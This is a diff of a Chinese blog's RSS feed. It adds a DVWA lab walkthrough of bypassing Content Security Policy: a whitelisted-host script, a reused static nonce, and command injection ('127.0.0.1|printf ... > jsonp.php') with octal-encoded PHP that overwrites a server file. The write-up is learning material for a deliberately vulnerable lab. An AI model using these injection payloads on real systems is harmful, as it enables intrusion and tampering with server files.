@@ -1,4 +1,184 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DVWA on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/dvwa/</link><description>Recent content in DVWA on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 28 Apr 2022 17:21:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/dvwa/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-存储型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</link><pubDate>Thu, 28 Apr 2022 17:21:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>dvwa on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/dvwa/</link><description>Recent content in dvwa on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 29 Apr 2022 00:00:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/dvwa/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-CSP BYPASS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-12/</link><pubDate>Fri, 29 Apr 2022 00:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-12/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。&lt;/p>
+&lt;p>直接开干吧。&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;p>CSP 是 &lt;em>Content Security Policy&lt;/em> ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 &lt;code>&amp;lt;script src=&amp;quot;...&amp;quot;&lt;/code>、&lt;code>&amp;lt;img src=&amp;quot;...&amp;quot;&lt;/code> 这样的外部来源。&lt;/p>
+&lt;p>比如说，设置 &lt;code>Content-Security-Policy: script-src 'self'&lt;/code> 就会约束脚本&lt;code>src&lt;/code>必须和当前页面同源。&lt;/p>
+&lt;p>&lt;code>Content-Security-Policy&lt;/code> 支持的策略非常多，懒得一一列举了，常见的有 &lt;code>default-src&lt;/code> 、&lt;code>script-src&lt;/code> 这些。&lt;/p>
+&lt;h2 id="解题">解题&lt;/h2>
+&lt;h3 id="low收集信息">Low：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687.png"
+width="675"
+height="294"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091729687_hu2f3cc289af47230eaf92438df0fbafe5_27328_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429091729687"
+class="gallery-image"
+data-flex-grow="229"
+data-flex-basis="551px"
+>&lt;/p>
+&lt;p>看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350.png"
+width="1905"
+height="77"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429091905350_huf724763d9e09669555078623fbf57dc1_17736_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429091905350"
+class="gallery-image"
+data-flex-grow="2474"
+data-flex-basis="5937px"
+>&lt;/p>
+&lt;pre>&lt;code>Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: &amp;quot;script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com&amp;quot;. Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
+&lt;/code>&lt;/pre>&lt;p>设置了&lt;code>script-src&lt;/code>策略，注意到策略里允许了 &lt;code>pastebin&lt;/code>、&lt;code>hastebin&lt;/code>、&lt;code>toptal&lt;/code> 这些网站。&lt;/p>
+&lt;h3 id="low解题">Low：解题&lt;/h3>
+&lt;p>在 &lt;code>hastebin.com&lt;/code> 写一句 &lt;code>alert(1)&lt;/code> ，保存并取纯文本链接，然后贴到这里。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962.png"
+width="1028"
+height="179"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092314962_hubd3c494cde831b92d1ca32445eee79b0_9689_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429092314962"
+class="gallery-image"
+data-flex-grow="574"
+data-flex-basis="1378px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h3 id="medium收集信息">Medium：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248.png"
+width="689"
+height="281"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429092433248_hu4909a87c56a722d6a8ba60b4ed3a10d6_26990_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429092433248"
+class="gallery-image"
+data-flex-grow="245"
+data-flex-basis="588px"
+>&lt;/p>
+&lt;p>提示不管写什么都会直接丢到这里，看你能不能弹出个&lt;code>alert&lt;/code>。&lt;/p>
+&lt;p>尝试写一个&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，发现出错：&lt;/p>
+&lt;pre>&lt;code>Refused to execute inline script because it violates the following Content Security Policy directive: &amp;quot;script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='&amp;quot;. Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.
+&lt;/code>&lt;/pre>&lt;p>提示CSP禁止了inline脚本，但后面备注&lt;code>unsafe-inline&lt;/code>会在源列表里有&lt;code>hash&lt;/code>和&lt;code>nonce&lt;/code>的情况下忽略。&lt;/p>
+&lt;h3 id="medium解题">Medium：解题&lt;/h3>
+&lt;p>尝试在 payload 上加上 &lt;code>nonce&lt;/code>：&lt;code>&amp;lt;script nonce&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，错误不变。&lt;/p>
+&lt;p>加上 &lt;code>src&lt;/code>，随便选一个真实存在的 js：&lt;code>&amp;lt;script src=&amp;quot;/dvwa/js/dvwaPage.js&amp;quot; nonce&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>，错误消失。但脚本没有执行。无奈看了下帮助，提示注意 CSP 的 &lt;code>nonce&lt;/code> 策略。于是翻了下请求历史，发现 &lt;code>nonce&lt;/code> 不变。&lt;/p>
+&lt;p>于是修改 payload，&lt;code>nonce&lt;/code> 设置为固定值：&lt;code>&amp;lt;script nonce=&amp;quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&amp;quot;&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302.png"
+width="1004"
+height="183"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093610302_hu12441bbc3f3a7c406e6400dd6e11b998_9655_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429093610302"
+class="gallery-image"
+data-flex-grow="548"
+data-flex-basis="1316px"
+>&lt;/p>
+&lt;p>需要注意的是 &lt;code>nonce-&lt;/code> 这个前缀不用放到 &lt;code>script&lt;/code> 标签的 &lt;code>nonce&lt;/code> 里。&lt;/p>
+&lt;h3 id="high收集信息">High：收集信息&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904.png"
+width="679"
+height="314"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093750904_hu10d926e0d3861b784670f7dda4ca3481_29216_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429093750904"
+class="gallery-image"
+data-flex-grow="216"
+data-flex-basis="518px"
+>&lt;/p>
+&lt;p>点击&lt;code>Solve the sum&lt;/code>后：&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724.png"
+width="146"
+height="68"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429093808724_hu0b3e44bc905f71795c43342edf52ba01_2030_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429093808724"
+class="gallery-image"
+data-flex-grow="214"
+data-flex-basis="515px"
+>&lt;/p>
+&lt;p>提示是修改指定的页面来运行自己的代码，怪。这要怎么做？没思路了，看一眼帮助，并没有帮助。&lt;/p>
+&lt;p>这一次的 &lt;code>Content-Security-Policy&lt;/code>是&lt;code>script-src 'self'&lt;/code>，点击&lt;code>Solve the sum&lt;/code>产生请求&lt;code>jsonp.php?callback=solveSum&lt;/code>。返回结果是一个 js 脚本。审阅代码没有包含 &lt;code>jsonp.php&lt;/code> 的内容。&lt;/p>
+&lt;p>好吧。先试试请求 &lt;code>jsonp.php&lt;/code>，改一下&lt;code>callback&lt;/code>参数，请求&lt;code>http://localhost:8080/vulnerabilities/csp/source/jsonp.php?alert&lt;/code>。结果返回一个空页面，没有js。所以提示还是对的，只能改&lt;code>jsonp.php&lt;/code>文件完成High难度。&lt;/p>
+&lt;p>改法可以很简单=。=我们先拿命令注入提取出&lt;code>jsonp.php&lt;/code>文件，方便下载。&lt;/p>
+&lt;pre>&lt;code>n|cp /var/www/html/vulnerabilities/csp/source/jsonp.php /var/www/html/jsonp.txt
+&lt;/code>&lt;/pre>&lt;p>然后访问&lt;code>/jsonp.txt&lt;/code>拿到内容：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;span class="nx">header&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Type: application/json; charset=UTF-8&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">array_key_exists&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;callback&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="nv">$callback&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;callback&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="nv">$outp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s2">&amp;#34;15&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">echo&lt;/span> &lt;span class="nv">$callback&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;(&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">json_encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$outp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;)&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>emm，没什么特别的，接着看下前端怎么处理 &lt;code>jsonp.php&lt;/code> 返回的内容。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">function&lt;/span> &lt;span class="nx">clickButton&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createElement&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;source/jsonp.php?callback=solveSum&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">appendChild&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="kd">function&lt;/span> &lt;span class="nx">solveSum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;answer&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;answer&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="kd">var&lt;/span> &lt;span class="nx">solve_button&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;solve&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">solve_button&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="nx">solve_button&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;click&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="nx">clickButton&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;span class="p">});&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>重点来了：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createElement&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;script&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;source/jsonp.php?callback=solveSum&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">appendChild&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接把 &lt;code>jsonp.php&lt;/code> 返回的内容当成了 &lt;code>script&lt;/code> 标签的内容，也就是在 &lt;code>jsonp.php&lt;/code> 返回随便什么东西前端都会执行。&lt;/p>
+&lt;p>那下一步就容易了，利用命令注入漏洞注入一个新的 php 标签，并输出 &lt;code>alert&lt;/code>。先写一个脚本把脚本编码成&lt;code>printf&lt;/code> 接受的8进制转义。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">encoded&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php echo &lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">alert(1)&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">; ?&amp;gt;&amp;#39;&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s1">&amp;#39;()&amp;amp;|-$`;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">encoded&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">0&lt;/span>&lt;span class="si">{:o}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">encoded&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">c&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到结果之后，变形一下payload：&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;&amp;gt;/var/www/html/jsonp.txt&lt;/code>。执行后检查：&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056.png"
+width="327"
+height="56"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103150056_hub5c6d67aa168f3580750181df77868f2_1189_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429103150056"
+class="gallery-image"
+data-flex-grow="583"
+data-flex-basis="1401px"
+>&lt;/p>
+&lt;p>再真正注入到 &lt;code>jsonp.php&lt;/code> 里。&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;&amp;gt;/var/www/html/vulnerabilities/csp/source/jsonp.php&lt;/code>，返回后发现有语法错误。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118.png"
+width="300"
+height="59"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103315118_hu75aa511ad34f2242e8072357aa88b0e3_5600_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429103315118"
+class="gallery-image"
+data-flex-grow="508"
+data-flex-basis="1220px"
+>&lt;/p>
+&lt;p>是我大意了=。=算了，直接覆盖掉 &lt;code>jsonp.php&lt;/code> 完事。&lt;code>127.0.0.1|printf '&amp;lt;?php echo \047alert\0501\051\047\073 ?&amp;gt;'&amp;gt;/var/www/html/vulnerabilities/csp/source/jsonp.php&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845.png"
+width="819"
+height="209"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-12/image-20220429103448845_hu6c77229d9cdd2a99b846bd1ffe887a6d_16620_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220429103448845"
+class="gallery-image"
+data-flex-grow="391"
+data-flex-basis="940px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>一定要总结的话就是确实有黑客思维这回事。题目并不是真的在考一个固定知识点，虽然是在CSP题，但真正的关键工作是在命令注入完成的，只是观察CSP这个页面的话是什么也干不成的，即使没有 CSP 干瞪着这个页面也干不成，就算有创建&lt;code>script&lt;/code>标签设置内容的&lt;code>js&lt;/code>也利用不到。&lt;/p>
+&lt;p>但抱怨还是有抱怨的。因为我通关DVWA的目的是学习=。=CSP的 High 难度选择用命令注入当突破口，对了解 CSP 本身就没啥用了，命令注入本身可以干的事情就远不止弄死一个 CSP 这么点=。=&lt;/p>
+&lt;p>总之，也行吧。多少对 CSP 有点了解了。&lt;/p></description></item><item><title>DVWA上手记录-存储型XSS</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</link><pubDate>Thu, 28 Apr 2022 17:21:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-11/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
 &lt;p>还是很简单。&lt;/p>
 &lt;h2 id="原理">原理&lt;/h2>
 &lt;p>没过滤就保存到了数据库里，渲染的时候也没做好过滤。&lt;/p>
